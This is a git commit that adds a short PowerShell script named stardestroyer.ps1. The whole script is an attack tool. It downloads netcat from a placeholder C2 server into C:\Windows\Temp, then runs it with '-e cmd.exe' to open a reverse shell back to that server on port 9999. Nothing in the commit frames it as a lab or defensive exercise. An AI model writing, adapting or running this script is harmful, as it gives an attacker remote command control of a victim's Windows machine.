87a54a5fe4e51f93fa846070c369041b2d81fe8b
BwithE <144924113+BwithE@users.noreply.github.com>
2024-09-16 19:31:43 -0400

    Create stardestroyer.ps1

---
+++ stardestroyer.ps1
@@ -0,0 +1,8 @@
+# ENTER your C2-SERVER-IP
+$c2serverip = "C2-SERVER-IP"
+
+# download netcat from C2
+powershell wget -Uri http://$c2serverip/nc.exe -OutFile C:\Windows\Temp\nc.exe
+
+# connect to c2 with netcat
+C:\Windows\Temp\nc.exe -e cmd.exe $c2serverip 9999
